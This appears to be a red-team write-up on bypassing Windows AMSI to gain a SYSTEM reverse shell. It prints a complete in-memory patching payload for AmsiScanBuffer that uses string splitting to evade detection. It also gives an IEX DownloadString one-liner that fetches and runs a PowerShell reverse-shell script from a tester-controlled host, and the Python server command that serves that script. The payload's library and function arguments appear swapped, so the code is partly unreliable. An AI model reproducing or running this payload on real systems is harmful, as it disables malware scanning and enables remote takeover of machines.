## Outline

The goal of this write-up is to demonstrate bypassing the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28). The objective was to gain a Remote Code Execution (RCE) as NT/Authority System.

AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime

By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two APIâ€™s are used by the antivirus to scan the buffer and strings for signs of malware. This ultimately prevents arbitrary execution of code.
# AMSI Evasion
The following evasive techniques aim to avoid detection by antivirus and security software.  

##### Code Fragmentation: 
Divide codes into smaller components and assemble at runtime, evading static analysis.  

##### Obfuscation: 
Utilize obfuscation techniques to obscure the true intent of the script, making it challenging for AMSI scanners to interpret the code accurately.  

#####  Memory Patching: 
Modify the AMSI Dynamic Link Library (DLL) in memory to either disable or alter its functionality temporarily.  

#### Powershell Downgrade: 
Downgrade to Windows PowerShell 2.0. It lacks essential security controls like AMSI protection, making it susceptible to exploitation as a means of evasion.

## Proof of Concept

To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command in memory.
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
## Memory Patching
In order to bypass AMSI, the tester utilzed the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
```bash
$thing = @"
// thing 
// using System.Collections.ArrayList;
using System; // thingssa
using System.Runtime.InteropServices;
public class payload {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $thing
[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)

[byte[]]$byteArrayFun = "","","","","",""
$byteArrayFun[0] = $Patch[0]
$byteArrayFun[1] = $Patch[1]
$byteArrayFun[2] = $Patch[2]
$byteArrayFun[3] = $Patch[3]
$byteArrayFun[4] = $Patch[4]
$byteArrayFun[5] = $Patch[5]

$to = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
$connect = "a" + "m" + "si" + ".dl" + "l"
$librarz = [payload]::LoadLibrary($to)
$dest = [payload]::GetProcAddress($librarz, $connect)
$p = 0
[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)

[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
```


By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code, effectively avoiding the scanning of PowerShell code. This method allows the attacker's PowerShell code to execute without triggering AMSI's detection.

However, it is essential to acknowledge that even with the aforementioned payload, AMSI might still identify the content as malicious unless proper obfuscation methodologies are implemented. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.

After implementing effective obfuscation techniques, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
```bash
python3 -m http.server 8443
```

Taking advantage of the AMSI.dll malfunction, the tester successfully initiated a reverse TCP connection via PowerShell, executing the following command in memory:
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
